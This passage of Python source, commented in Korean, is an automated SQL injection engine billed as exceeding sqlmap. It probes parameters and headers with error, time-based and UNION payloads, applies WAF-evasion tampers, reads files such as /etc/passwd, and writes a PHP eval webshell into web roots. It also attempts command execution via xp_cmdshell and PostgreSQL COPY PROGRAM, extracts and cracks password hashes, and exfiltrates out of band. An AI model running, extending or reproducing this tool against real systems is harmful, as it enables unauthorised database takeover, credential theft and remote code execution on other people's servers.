        if response_times.get("pg_sleep", 0) > 3:
            return "postgresql"
        return "unknown"

    @staticmethod
    def parse_mysql_version(version_str: str) -> dict:
        """MySQL 버전 파싱 → 취약 버전 여부 확인"""
        parts = version_str.split("|")
        result = {"version_raw": version_str}
        if parts:
            ver = parts[0].strip()
            result["version"] = ver
            # 취약 버전 체크
            try:
                major, minor, patch = [int(x) for x in ver.split(".")[:3]]
                result["vulnerable_cves"] = []
                if (major, minor) < (5, 7):
                    result["vulnerable_cves"].append("CVE-2012-2122 (auth bypass)")
                if (major, minor) == (5, 6) and patch < 45:
                    result["vulnerable_cves"].append("CVE-2019-2725")
                if (major, minor) >= (8, 0) and patch < 28:
                    result["vulnerable_cves"].append("CVE-2022-21417")
            except Exception:
                pass
        if len(parts) > 1:
            result["os"] = parts[1].strip()
        if len(parts) > 2:
            result["arch"] = parts[2].strip()
        return result


# ══════════════════════════════════════════════════════════════════════════════
# MAIN ENGINE — 전체 오케스트레이션
# ══════════════════════════════════════════════════════════════════════════════

@dataclass
class SqliAdvancedFinding:
    url: str
    param: str
    technique: str          # "error" | "union" | "blind_bool" | "blind_time" | "stacked" | "oob"
    db_type: str
    db_version: str = ""
    db_user: str = ""
    db_name: str = ""
    os_info: str = ""
    payload: str = ""
    tampers_used: list[str] = field(default_factory=list)
    rce_achieved: bool = False
    webshell_url: str = ""
    files_read: list[str] = field(default_factory=list)
    hashes_found: list[HashInfo] = field(default_factory=list)
    severity: str = "CRITICAL"
    cvss: float = 9.8
    note: str = ""


@dataclass
class SqliAdvancedReport:
    target: str
    db_type: str
    level: int
    risk: int
    findings: list[SqliAdvancedFinding] = field(default_factory=list)
    second_order_findings: list[SecondOrderFinding] = field(default_factory=list)
    files_read: dict[str, str] = field(default_factory=dict)  # path → content
    hashes: list[HashInfo] = field(default_factory=list)

    def summary(self) -> str:
        lines = [
            f"[SQLI ADVANCED] {self.target} | DB: {self.db_type} | Level:{self.level} Risk:{self.risk}",
            f"  인젝션 포인트: {len(self.findings)}개",
            f"  2차 인젝션: {len(self.second_order_findings)}개",
            f"  파일 읽기 성공: {len(self.files_read)}개",
            f"  해시 발견: {len(self.hashes)}개",
        ]
        for f in self.findings:
            rce = " [RCE!]" if f.rce_achieved else ""
            shell = f" → {f.webshell_url}" if f.webshell_url else ""
            lines.append(f"  [{f.technique.upper():12}] {f.param} | DB:{f.db_type} | {f.db_version}{rce}{shell}")
        return "\n".join(lines)


class SqliAdvancedEngine:
    """
    sqlmap 초과 수준 SQL 인젝션 엔진

    Parameters
    ----------
    request_fn : Callable[[str, str, dict, str], tuple[int, str]]
        (url, method, headers, body) → (status_code, response_body)
    db_type : str — 탐지된 DB 타입 (없으면 자동 탐지)
    waf_type : str — 탐지된 WAF 타입 (tamper 자동 선택)
    level : int (1~5)
    risk  : int (1~3)
    oob_domain : str — OOB용 콜라보레이터 도메인 (없으면 OOB 비활성화)
    """

    def __init__(
        self,
        request_fn: Callable[[str, str, dict, str], tuple[int, str]],
        db_type: str = "unknown",
        waf_type: str = "unknown",
        level: int = 3,
        risk: int = 2,
        oob_domain: str = "",
    ) -> None:
        self.req = request_fn
        self.db_type = db_type
        self.waf_type = waf_type
        self.config = SqliLevelRisk(level=level, risk=risk)
        self.tampers = TamperLibrary.recommend_tampers(waf_type)
        self.oob = OobChannel(collaborator_domain=oob_domain, db_type=db_type) if oob_domain else None
        self.fingerprinter = DbFingerprinter()
        self.hash_analyzer = HashAnalyzer()
        self._baseline_time = 0.0

    # ── 요청 + tamper 자동 적용 ─────────────────────────────────────────────
    def _req_with_tamper(self, url: str, param: str, payload: str, method: str = "GET") -> tuple[int, str, float]:
        tampered = TamperLibrary.apply_chain(payload, self.tampers)
        if "?" in url:
            test_url = re.sub(rf"({param}=)[^&]*", rf"\g<1>{urllib.parse.quote(tampered)}", url)
        else:
            test_url = url
        headers = {"User-Agent": "Mozilla/5.0", "Accept": "*/*"}
        t0 = time.time()
        status, body = self.req(test_url, method, headers, "")
        elapsed = time.time() - t0
        return status, body, elapsed

    # ── DB 타입 자동 탐지 ───────────────────────────────────────────────────
    def auto_detect_db(self, url: str, param: str) -> str:
        probes = [
            ("' AND SLEEP(0)--", "mysql"),
            ("' WAITFOR DELAY '0:0:0'--", "mssql"),
            ("' AND pg_sleep(0)--", "postgresql"),
            ("' AND 1=UTL_HTTP.REQUEST('http://x')--", "oracle"),
        ]
        for payload, candidate in probes:
            _, body, _ = self._req_with_tamper(url, param, payload)
            detected = DbFingerprinter.detect_from_error(body)
            if detected != "unknown":
                return detected
        return "mysql"  # 기본값

    # ── 기본 Error-Based 탐지 ───────────────────────────────────────────────
    def test_error_based(self, url: str, param: str) -> SqliAdvancedFinding | None:
        error_payloads = {
            "mysql": ["'", "''", "')", "'))", "\"", "\\", "' AND EXTRACTVALUE(1,CONCAT(0x7e,database()))--"],
            "mssql": ["'", "''", "';--", "' AND 1=CONVERT(int,@@version)--"],
            "postgresql": ["'", "''", "' AND 1=CAST(version() AS INT)--"],
            "unknown": ["'", "\"", "\\", "';--", "' OR '1'='1"],
        }
        payloads = error_payloads.get(self.db_type, error_payloads["unknown"])

        _, baseline_body, self._baseline_time = self._req_with_tamper(url, param, "1")

        for payload in payloads:
            _, body, _ = self._req_with_tamper(url, param, payload)
            db_detected = DbFingerprinter.detect_from_error(body)
            if db_detected != "unknown":
                return SqliAdvancedFinding(
                    url=url, param=param, technique="error",
                    db_type=db_detected, payload=payload,
                    tampers_used=self.tampers,
                )
        return None

    # ── 시간 기반 블라인드 ──────────────────────────────────────────────────
    def test_time_based(self, url: str, param: str) -> SqliAdvancedFinding | None:
        delay = self.config.time_delay
        time_payloads = {
            "mysql": [
                f"' AND SLEEP({delay})--",
                f"' OR SLEEP({delay})--",
                f"1 AND SLEEP({delay})",
                f"'; SLEEP({delay})--",
            ],
            "mssql": [
                f"'; WAITFOR DELAY '0:0:{delay}'--",
                f"' AND 1=(SELECT 1 FROM (SELECT SLEEP({delay}))x)--",
            ],
            "postgresql": [
                f"'; SELECT pg_sleep({delay})--",
                f"' AND (SELECT 1 FROM (SELECT pg_sleep({delay}))x) IS NOT NULL--",
            ],
            "oracle": [
                f"' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',{delay})--",
            ],
            "unknown": [
                f"' AND SLEEP({delay})--",
                f"'; WAITFOR DELAY '0:0:{delay}'--",
                f"'; SELECT pg_sleep({delay})--",
            ],
        }
        payloads = time_payloads.get(self.db_type, time_payloads["unknown"])

        for payload in payloads:
            _, _, elapsed = self._req_with_tamper(url, param, payload)
            if elapsed >= delay - 0.5:
                db = self.db_type if self.db_type != "unknown" else "mysql"
                return SqliAdvancedFinding(
                    url=url, param=param, technique="blind_time",
                    db_type=db, payload=payload,
                    tampers_used=self.tampers,
                    note=f"응답 지연 {elapsed:.1f}s (임계값 {delay}s)",
                )
        return None

    # ── UNION 컬럼 수 탐지 ──────────────────────────────────────────────────
    def detect_union_cols(self, url: str, param: str, max_cols: int = 15) -> int:
        for n in range(1, max_cols + 1):
            nulls = ",".join(["NULL"] * n)
            payload = f"' UNION SELECT {nulls}--"
            _, body, _ = self._req_with_tamper(url, param, payload)
            if "error" not in body.lower() and len(body) > 100:
                return n
        return 0

    # ── 데이터 추출 (DB명/유저/버전) ─────────────────────────────────────────
    def extract_db_info(self, url: str, param: str, col_idx: int, total_cols: int) -> dict:
        queries = DbFingerprinter.VERSION_QUERIES.get(self.db_type, "SELECT @@version")
        user_q = DbFingerprinter.USER_QUERIES.get(self.db_type, "SELECT user()")
        info = {}

        for key, sql in [("version", queries), ("user", user_q)]:
            cols = ["NULL"] * total_cols
            cols[col_idx] = f"({sql})"
            payload = f"' UNION SELECT {','.join(cols)}--"
            _, body, _ = self._req_with_tamper(url, param, payload)
            # 응답에서 값 추출
            matches = re.findall(r'([0-9]+\.[0-9]+\.[0-9][^<\s\"\']{0,50})', body)
            if matches:
                info[key] = matches[0]
            else:
                info[key] = ""
        return info

    # ── LOAD_FILE 자동 시도 ─────────────────────────────────────────────────
    def try_file_read(self, url: str, param: str, col_idx: int, total_cols: int) -> dict[str, str]:
        results = {}
        payloads = FileSystemEngine.auto_read_sensitive(col_idx, total_cols)
        targets = FileSystemEngine.READ_TARGETS["linux"][:5]  # 상위 5개만

        for i, payload in enumerate(payloads[:5]):
            _, body, _ = self._req_with_tamper(url, param, payload.replace("' UNION", "' UNION"))
            # /etc/passwd 패턴 탐지
            if re.search(r"root:x?:\d+:\d+:", body) or "mysql:" in body:
                results[targets[i]] = body[:500]
        return results

    # ── WebShell 쓰기 시도 ──────────────────────────────────────────────────
    def try_webshell_write(self, url: str, param: str, col_idx: int, total_cols: int) -> str:
        web_paths = [
            "/var/www/html/bingo_shell.php",
            "/var/www/html/images/bingo_shell.php",
            "/usr/share/nginx/html/bingo_shell.php",
            "/home/wwwroot/default/bingo_shell.php",
        ]
        shell = "<?php @eval($_POST['c']);?>"

        for path in web_paths:
            payload = FileSystemEngine.into_outfile_webshell(path, shell)
            _, body, _ = self._req_with_tamper(url, param, payload)
            if "error" not in body.lower():
                # 웹쉘 접근 확인
                base = re.match(r"(https?://[^/]+)", url)
                if base:
                    shell_url = base.group(1) + path.replace("/var/www/html", "").replace("/usr/share/nginx/html", "")
                    return shell_url
        return ""

    # ── OOB 추출 (DNS/HTTP) ─────────────────────────────────────────────────
    def try_oob_extraction(self, url: str, param: str, sql_expr: str) -> bool:
        if not self.oob:
            return False
        payload = self.oob.generate(sql_expr)
        _, _, _ = self._req_with_tamper(url, param, payload)
        return True  # DNS 응답은 외부에서 확인

    # ── Stacked Queries RCE ─────────────────────────────────────────────────
    def try_stacked_rce(self, url: str, param: str) -> str:
        stacked_payloads = []
        if self.db_type == "mssql":
            stacked_payloads = [
                StackedQueryEngine.mssql_xp_cmdshell("whoami"),
                StackedQueryEngine.mssql_ole_automation("cmd.exe /c whoami"),
            ]
        elif self.db_type == "postgresql":
            stacked_payloads = [
                StackedQueryEngine.postgresql_copy_program("id > /tmp/x"),
            ]
        elif self.db_type == "mysql":
            stacked_payloads = FileSystemEngine.into_outfile_webshell_list = \
                StackedQueryEngine.mysql_into_outfile_shell()

        for payload in stacked_payloads:
            _, body, _ = self._req_with_tamper(url, param, payload)
            if "NT AUTHORITY" in body or "SYSTEM" in body or "root" in body.lower():
                return payload
        return ""

    # ── 해시 추출 + 분석 ────────────────────────────────────────────────────
    def extract_and_analyze_hashes(self, response_body: str) -> list[HashInfo]:
        hash_patterns = [
            r"[a-f0-9]{32}",    # MD5
            r"[a-f0-9]{40}",    # SHA1
            r"[a-f0-9]{64}",    # SHA256
            r"\*[A-F0-9]{40}",  # MySQL hash
            r"\$2[aby]\$\d{2}\$.{53}",  # bcrypt
            r"\$P\$.{31}",      # PHPass
        ]
        found_hashes = set()
        for pattern in hash_patterns:
            matches = re.findall(pattern, response_body, re.IGNORECASE)
            found_hashes.update(matches)

        results = []
        for h in found_hashes:
            info = self.hash_analyzer.analyze(h)
            if info:
                # 빠른 크래킹 시도
                cracked = HashAnalyzer.quick_crack(h)
                if cracked:
                    info.note = f"크래킹 성공: {cracked}"  # type: ignore
                results.append(info)
        return results

    # ── 메인 자동 스캔 ───────────────────────────────────────────────────────
    def auto_scan(
        self,
        url: str,
        params: list[str],
        second_order_urls: list[str] | None = None,
    ) -> SqliAdvancedReport:
        """
        전체 SQLi 자동 스캔 + RCE 시도까지 완전 자동화

        Parameters
        ----------
        url : str — 타겟 URL (파라미터 포함)
        params : list[str] — 테스트할 파라미터 이름 목록
        second_order_urls : list[str] | None — 2차 인젝션 트리거 URL 목록
        """
        # DB 타입 자동 탐지
        if self.db_type == "unknown" and params:
            self.db_type = self.auto_detect_db(url, params[0])

        report = SqliAdvancedReport(
            target=url,
            db_type=self.db_type,
            level=self.config.level,
            risk=self.config.risk,
        )

        for param in params:
            # 1. Error-based
            finding = self.test_error_based(url, param)

            # 2. Time-based (Error 실패 시)
            if not finding:
                finding = self.test_time_based(url, param)

            if not finding:
                continue

            # 3. UNION 컬럼 수 탐지
            col_count = self.detect_union_cols(url, param)
            if col_count > 0:
                finding.technique = "union"

                # 4. DB 정보 추출
                db_info = self.extract_db_info(url, param, 0, col_count)
                finding.db_version = db_info.get("version", "")
                finding.db_user = db_info.get("user", "")

                # 5. 파일 읽기 시도
                files = self.try_file_read(url, param, 0, col_count)
                if files:
                    finding.files_read = list(files.keys())
                    report.files_read.update(files)

                # 6. 웹쉘 쓰기 시도 (Risk >= 2)
                if self.config.risk >= 2:
                    shell_url = self.try_webshell_write(url, param, 0, col_count)
                    if shell_url:
                        finding.rce_achieved = True
                        finding.webshell_url = shell_url

            # 7. Stacked RCE 시도 (MSSQL/PG, Risk >= 2)
            if self.db_type in ("mssql", "postgresql") and self.config.risk >= 2:
                rce_payload = self.try_stacked_rce(url, param)
                if rce_payload:
                    finding.rce_achieved = True
                    finding.payload = rce_payload

            # 8. OOB (oob_domain 설정 시)
            if self.oob:
                self.try_oob_extraction(url, param, "database()")

            # 9. 해시 분석
            _, full_body, _ = self._req_with_tamper(url, param, "1")
            hashes = self.extract_and_analyze_hashes(full_body)
            finding.hashes_found = hashes
            report.hashes.extend(hashes)

            report.findings.append(finding)

        # 10. 헤더 인젝션 (Level >= 3)
        if self.config.level >= 3:
            for header in self.config.test_headers:
                header_finding = self._test_header_injection(url, header)
                if header_finding:
                    report.findings.append(header_finding)

        return report

    def _test_header_injection(self, url: str, header: str) -> SqliAdvancedFinding | None:
        test_val = f"' AND SLEEP({self.config.time_delay})--"
        headers = {header: test_val, "User-Agent": "Mozilla/5.0"}
        t0 = time.time()
        try:
            self.req(url, "GET", headers, "")
        except Exception:
            return None
        elapsed = time.time() - t0
        if elapsed >= self.config.time_delay - 0.5:
            return SqliAdvancedFinding(
                url=url, param=f"[Header:{header}]",
                technique="blind_time", db_type=self.db_type,
                payload=test_val, tampers_used=self.tampers,
                note=f"헤더 인젝션: {header} 응답지연 {elapsed:.1f}s",
            )
        return None
